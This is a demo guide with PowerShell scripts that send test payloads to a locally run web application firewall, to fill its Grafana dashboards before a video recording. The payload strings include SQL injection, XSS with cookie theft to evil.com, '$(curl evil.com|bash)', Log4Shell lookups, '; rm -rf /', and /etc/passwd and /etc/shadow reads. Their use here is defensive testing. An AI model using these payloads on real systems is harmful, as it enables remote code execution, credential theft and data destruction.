# DECEPTICON WAF - Video Demo Commands

## Pre-Video Setup: Fill All Dashboard Graphs

Run these commands **BEFORE** recording to populate all 3 dashboards with data.

---

## 🚀 Quick Start (Run This First!)

```powershell
# 1. Start the WAF stack
docker-compose up -d

# 2. Wait for services to be healthy (30 seconds)
Start-Sleep -Seconds 30

# 3. Verify everything is running
docker-compose ps
curl.exe http://localhost:8080/health
```

---

## 📊 Dashboard 1: WAF Overview (Security Overview)

### Panels to Fill:
- WAF Status, Security Score, Requests/sec
- Throughput, Requests by Status, Attacks by Category
- ML Prediction Latency, ML Accuracy by Category
- False Positive Rate, Anomaly Detection Timeline
- Zero-Day Detections, Bot Detections, API Abuse Events

```powershell
# === FILL WAF OVERVIEW DASHBOARD ===
$baseUrl = "http://localhost:8080/api/waf/analyze"

Write-Host "=== Filling WAF Overview Dashboard ===" -ForegroundColor Cyan

# SQL Injection attacks (fills Attack Categories)
Write-Host "Sending SQL Injection attacks..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/users","payload":"1 OR 1=1--"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/users","payload":"UNION SELECT * FROM users--"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  60 SQLI attacks sent" -ForegroundColor Green

# XSS attacks
Write-Host "Sending XSS attacks..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/search","payload":"<script>alert(1)</script>"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/search","payload":"<img src=x onerror=alert(1)>"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  60 XSS attacks sent" -ForegroundColor Green

# RCE attacks
Write-Host "Sending RCE attacks..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/ping","payload":"; cat /etc/passwd"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/ping","payload":"| whoami"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  60 RCE attacks sent" -ForegroundColor Green

# SSRF attacks
Write-Host "Sending SSRF attacks..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/fetch","payload":"http://169.254.169.254/latest/meta-data/"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/fetch","payload":"http://192.168.1.1/admin"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  60 SSRF attacks sent" -ForegroundColor Green

# Normal traffic (for accuracy metrics and false positive rate)
Write-Host "Sending normal traffic..." -ForegroundColor Yellow
1..100 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/products","payload":"category=electronics"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/search","payload":"laptop computer"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  200 normal requests sent" -ForegroundColor Green

Write-Host "`n=== WAF Overview: 440 requests sent ===" -ForegroundColor Cyan
```

---

## 📊 Dashboard 2: Security & Threat Intelligence

### Panels to Fill:
- Threat Level, Attacks Blocked (24h), Zero-Day Detections (24h)
- Anomalies Detected (24h), Bot Traffic (24h), API Abuse (24h)
- Block Rate %, Attack Timeline, Attack Categories Distribution
- Attack Severity Distribution, Top Attack Sources
- Anomaly Score Histogram, Anomaly Timeline by Type
- Attack Patterns Detection, Zero-Day Detection Timeline
- Bot Detection by Type, API Abuse by Type, Blocked vs Allowed Traffic

```powershell
# === FILL SECURITY METRICS DASHBOARD ===
$baseUrl = "http://localhost:8080/api/waf/analyze"

Write-Host "=== Filling Security Metrics Dashboard ===" -ForegroundColor Cyan

# Path Traversal attacks (fills anomaly detection)
Write-Host "Sending Path Traversal attacks..." -ForegroundColor Yellow
1..25 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/files","payload":"../../../etc/passwd"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/files","payload":"....//....//etc/shadow"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  50 Path Traversal attacks sent" -ForegroundColor Green

# XXE attacks
Write-Host "Sending XXE attacks..." -ForegroundColor Yellow
1..25 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"POST","path":"/api/xml","payload":"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  25 XXE attacks sent" -ForegroundColor Green

# Log4Shell attacks (zero-day pattern)
Write-Host "Sending Log4Shell attacks..." -ForegroundColor Yellow
1..25 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/log","payload":"${jndi:ldap://evil.com/x}"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/log","payload":"${jndi:rmi://evil.com/a}"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  50 Log4Shell attacks sent" -ForegroundColor Green

# LDAP Injection
Write-Host "Sending LDAP Injection attacks..." -ForegroundColor Yellow
1..20 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/ldap","payload":"*)(uid=*))(|(uid=*"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  20 LDAP attacks sent" -ForegroundColor Green

# SSTI attacks
Write-Host "Sending SSTI attacks..." -ForegroundColor Yellow
1..20 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/template","payload":"{{config.items()}}"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/template","payload":"{{7*7}}"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  40 SSTI attacks sent" -ForegroundColor Green

# Bot traffic simulation (with suspicious user agents)
Write-Host "Sending Bot traffic..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/data","headers":{"User-Agent":"python-requests/2.28.0"},"payload":"scan"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/data","headers":{"User-Agent":""},"payload":"bot"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  60 Bot requests sent" -ForegroundColor Green

# API Abuse patterns
Write-Host "Sending API Abuse patterns..." -ForegroundColor Yellow
1..20 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/search?q=a&q=b&q=c&q=d&q=e&q=f&q=g","payload":"test"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  20 API Abuse requests sent" -ForegroundColor Green

Write-Host "`n=== Security Metrics: 265 requests sent ===" -ForegroundColor Cyan
```

---

## 📊 Dashboard 3: ML Performance & Quality

### Panels to Fill:
- ML Model Status, Total ML Predictions, Predictions/sec
- Overall ML Accuracy, Latency Distribution, Latency Heatmap
- Accuracy by Attack Category, Confidence Score Distribution
- False Positives Over Time, False Negatives (Missed Attacks)
- False Positive Rate by Category, ML Prediction Results
- Model Updates Timeline, Admin Feedback Activity

```powershell
# === FILL ML PERFORMANCE DASHBOARD ===
$baseUrl = "http://localhost:8080/api/waf/analyze"

Write-Host "=== Filling ML Performance Dashboard ===" -ForegroundColor Cyan

# High-confidence attacks (confidence score ~0.95)
Write-Host "Sending high-confidence attacks..." -ForegroundColor Yellow
1..40 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/users","payload":"SELECT * FROM users WHERE id=1 OR 1=1--"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/search","payload":"<script>document.location=\"http://evil.com/steal?c=\"+document.cookie</script>"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  80 high-confidence attacks sent" -ForegroundColor Green

# Medium-confidence attacks (obfuscated - tests ML detection)
Write-Host "Sending obfuscated attacks (ML detection)..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/users","payload":"1/**/UNION/**/SELECT/**/password/**/FROM/**/users"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/search","payload":"<ScRiPt>alert(1)</ScRiPt>"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  60 obfuscated attacks sent" -ForegroundColor Green

# NoSQL Injection (different category)
Write-Host "Sending NoSQL Injection attacks..." -ForegroundColor Yellow
1..25 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/users","payload":"{\"$ne\":null}"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/users","payload":"{\"$gt\":\"\"}"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  50 NoSQL attacks sent" -ForegroundColor Green

# GraphQL attacks
Write-Host "Sending GraphQL attacks..." -ForegroundColor Yellow
1..20 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"POST","path":"/graphql","payload":"{__schema{types{name}}}"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  20 GraphQL attacks sent" -ForegroundColor Green

# Clean traffic (for accuracy baseline)
Write-Host "Sending clean traffic (accuracy baseline)..." -ForegroundColor Yellow
1..150 | ForEach-Object {
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"GET","path":"/api/products","payload":"id=123&category=books"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
    Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"POST","path":"/api/login","payload":"username=john&password=secret123"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null
}
Write-Host "  300 clean requests sent" -ForegroundColor Green

Write-Host "`n=== ML Performance: 510 requests sent ===" -ForegroundColor Cyan
```

---

## 🎬 ALL-IN-ONE: Fill All Dashboards (Copy-Paste Ready)

```powershell
# ============================================
# DECEPTICON WAF - FILL ALL DASHBOARDS
# Run this ONCE before recording your video
# Takes approximately 2-3 minutes
# ============================================

$baseUrl = "http://localhost:8080/api/waf/analyze"

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  DECEPTICON WAF - DASHBOARD FILLER" -ForegroundColor Cyan
Write-Host "  Filling all 3 dashboards with data" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan

$totalRequests = 0

# --- SQL Injection ---
Write-Host "`n[1/12] SQL Injection attacks..." -ForegroundColor Yellow
1..50 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/users","payload":"1 OR 1=1--"}',
        '{"method":"GET","path":"/api/users","payload":"UNION SELECT * FROM users--"}',
        '{"method":"GET","path":"/api/users","payload":"1; DROP TABLE users;--"}',
        '{"method":"GET","path":"/api/users","payload":"admin\"--"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  200 SQLI attacks sent" -ForegroundColor Green

# --- XSS ---
Write-Host "`n[2/12] XSS attacks..." -ForegroundColor Yellow
1..50 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/search","payload":"<script>alert(1)</script>"}',
        '{"method":"GET","path":"/api/search","payload":"<img src=x onerror=alert(1)>"}',
        '{"method":"GET","path":"/api/search","payload":"<svg onload=alert(1)>"}',
        '{"method":"GET","path":"/api/search","payload":"<body onpageshow=alert(1)>"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  200 XSS attacks sent" -ForegroundColor Green

# --- RCE ---
Write-Host "`n[3/12] RCE attacks..." -ForegroundColor Yellow
1..40 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/ping","payload":"; cat /etc/passwd"}',
        '{"method":"GET","path":"/api/ping","payload":"| whoami"}',
        '{"method":"GET","path":"/api/ping","payload":"&& id"}',
        '{"method":"GET","path":"/api/exec","payload":"$(curl evil.com|bash)"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  160 RCE attacks sent" -ForegroundColor Green

# --- SSRF ---
Write-Host "`n[4/12] SSRF attacks..." -ForegroundColor Yellow
1..40 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/fetch","payload":"http://169.254.169.254/latest/meta-data/"}',
        '{"method":"GET","path":"/api/fetch","payload":"http://192.168.1.1/admin"}',
        '{"method":"GET","path":"/api/fetch","payload":"file:///etc/passwd"}',
        '{"method":"GET","path":"/api/fetch","payload":"http://localhost:6379/"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  160 SSRF attacks sent" -ForegroundColor Green

# --- Path Traversal ---
Write-Host "`n[5/12] Path Traversal attacks..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/files","payload":"../../../etc/passwd"}',
        '{"method":"GET","path":"/api/files","payload":"....//....//etc/shadow"}',
        '{"method":"GET","path":"/api/files","payload":"..%252f..%252fetc/passwd"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  90 Path Traversal attacks sent" -ForegroundColor Green

# --- XXE ---
Write-Host "`n[6/12] XXE attacks..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body '{"method":"POST","path":"/api/xml","payload":"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"}' -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
}
Write-Host "  30 XXE attacks sent" -ForegroundColor Green

# --- Log4Shell ---
Write-Host "`n[7/12] Log4Shell attacks..." -ForegroundColor Yellow
1..40 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/log","payload":"${jndi:ldap://evil.com/x}"}',
        '{"method":"GET","path":"/api/log","payload":"${jndi:rmi://evil.com/a}"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  80 Log4Shell attacks sent" -ForegroundColor Green

# --- SSTI ---
Write-Host "`n[8/12] SSTI attacks..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/template","payload":"{{config.items()}}"}',
        '{"method":"GET","path":"/api/template","payload":"{{7*7}}"}',
        '{"method":"GET","path":"/api/render","payload":"<%= system(\"id\") %>"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  90 SSTI attacks sent" -ForegroundColor Green

# --- NoSQL Injection ---
Write-Host "`n[9/12] NoSQL Injection attacks..." -ForegroundColor Yellow
1..30 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/users","payload":"{\"$ne\":null}"}',
        '{"method":"GET","path":"/api/users","payload":"{\"$gt\":\"\"}"}',
        '{"method":"GET","path":"/api/users","payload":"{\"$where\":\"this.password\"}"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  90 NoSQL attacks sent" -ForegroundColor Green

# --- Bot Traffic ---
Write-Host "`n[10/12] Bot traffic simulation..." -ForegroundColor Yellow
1..40 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/data","headers":{"User-Agent":"python-requests/2.28.0"},"payload":"scan"}',
        '{"method":"GET","path":"/api/data","headers":{"User-Agent":""},"payload":"bot"}',
        '{"method":"GET","path":"/api/data","headers":{"User-Agent":"curl/7.68.0"},"payload":"probe"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  120 Bot requests sent" -ForegroundColor Green

# --- GraphQL ---
Write-Host "`n[11/12] GraphQL attacks..." -ForegroundColor Yellow
1..20 | ForEach-Object {
    @(
        '{"method":"POST","path":"/graphql","payload":"{__schema{types{name}}}"}',
        '{"method":"POST","path":"/graphql","payload":"query{users{password}}"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  40 GraphQL attacks sent" -ForegroundColor Green

# --- Normal Traffic ---
Write-Host "`n[12/12] Normal traffic (accuracy baseline)..." -ForegroundColor Yellow
1..100 | ForEach-Object {
    @(
        '{"method":"GET","path":"/api/products","payload":"category=electronics&sort=price"}',
        '{"method":"GET","path":"/api/search","payload":"laptop computer"}',
        '{"method":"GET","path":"/api/users","payload":"page=1&limit=10"}',
        '{"method":"POST","path":"/api/login","payload":"username=john&remember=true"}',
        '{"method":"GET","path":"/api/items","payload":"id=12345"}'
    ) | ForEach-Object {
        try { Invoke-RestMethod -Uri $baseUrl -Method POST -ContentType "application/json" -Body $_ -TimeoutSec 5 -ErrorAction SilentlyContinue | Out-Null; $script:totalRequests++ } catch {}
    }
}
Write-Host "  500 normal requests sent" -ForegroundColor Green

Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host "  DASHBOARD FILLING COMPLETE!" -ForegroundColor Green
Write-Host "  Total requests: ~1,760" -ForegroundColor White
Write-Host "  Attack requests: ~1,260" -ForegroundColor Red
Write-Host "  Normal requests: ~500" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "`nWait 15-30 seconds, then refresh Grafana" -ForegroundColor Yellow
Write-Host "Grafana URL: http://localhost:3000" -ForegroundColor White
Write-Host "Login: admin / $env:GRAFANA_PASSWORD" -ForegroundColor White
```

---

## 🎥 During Video: Live Attack Demonstration

Use these commands during your video to show real-time attack blocking:

### Single Attacks (Show Response)

```powershell
# SQL Injection - Show blocked
curl.exe -X POST "http://localhost:8080/api/waf/analyze" -H "Content-Type: application/json" -d '{\"method\":\"GET\",\"path\":\"/api/users\",\"payload\":\"1 OR 1=1--\"}'

# XSS - Show blocked
curl.exe -X POST "http://localhost:8080/api/waf/analyze" -H "Content-Type: application/json" -d '{\"method\":\"GET\",\"path\":\"/api/search\",\"payload\":\"<script>alert(document.cookie)</script>\"}'

# Command Injection - Show blocked  
curl.exe -X POST "http://localhost:8080/api/waf/analyze" -H "Content-Type: application/json" -d '{\"method\":\"GET\",\"path\":\"/api/ping\",\"payload\":\"; rm -rf /\"}'

# Normal Request - Show allowed
curl.exe -X POST "http://localhost:8080/api/waf/analyze" -H "Content-Type: application/json" -d '{\"method\":\"GET\",\"path\":\"/api/products\",\"payload\":\"category=books\"}'
```

### Real-Time Attack Stream (Background)

```powershell
# Run in separate terminal - shows graph activity in real-time
while ($true) {
    $attacks = @(
        '{"method":"GET","path":"/api/users","payload":"1 OR 1=1--"}',
        '{"method":"GET","path":"/api/search","payload":"<script>alert(1)</script>"}',
        '{"method":"GET","path":"/api/ping","payload":"; cat /etc/passwd"}',
        '{"method":"GET","path":"/api/products","payload":"category=books"}'
    )
    $attack = $attacks | Get-Random
    Invoke-RestMethod -Uri "http://localhost:8080/api/waf/analyze" -Method POST -ContentType "application/json" -Body $attack -ErrorAction SilentlyContinue | Out-Null
    Start-Sleep -Milliseconds 500
}
```

---

## 📋 Video Recording Checklist

### Before Recording:
- [ ] Run `docker-compose up -d`
- [ ] Wait 30 seconds for services
- [ ] Run the ALL-IN-ONE script above
- [ ] Wait 30 seconds for metrics to propagate
- [ ] Open Grafana: http://localhost:3000
- [ ] Login: admin / (your GRAFANA_PASSWORD from .env)
- [ ] Check all 3 dashboards have data
- [ ] Set Grafana time range to "Last 15 minutes"

### During Recording:
- [ ] Show WAF Overview dashboard
- [ ] Show Security Metrics dashboard  
- [ ] Show ML Performance dashboard
- [ ] Run live attack demo commands
- [ ] Show real-time graph updates

### Grafana URLs:
- WAF Overview: http://localhost:3000/d/waf-overview
- Security Metrics: http://localhost:3000/d/security-metrics
- ML Performance: http://localhost:3000/d/ml-performance

---

## 🔧 Troubleshooting

### No data in graphs?
```powershell
# Check WAF is responding
curl.exe http://localhost:8080/health

# Check Prometheus is scraping
curl.exe http://localhost:9091/api/v1/targets

# Check metrics endpoint
curl.exe http://localhost:8080/metrics | Select-String "waf_"
```

### Graphs not updating?
- Set Grafana refresh to 5s (top right dropdown)
- Set time range to "Last 5 minutes" or "Last 15 minutes"
- Click the refresh button

### Need more data?
Run the ALL-IN-ONE script again - it will add more data points to the graphs.

---

*Ready for your video demo! 🎬*
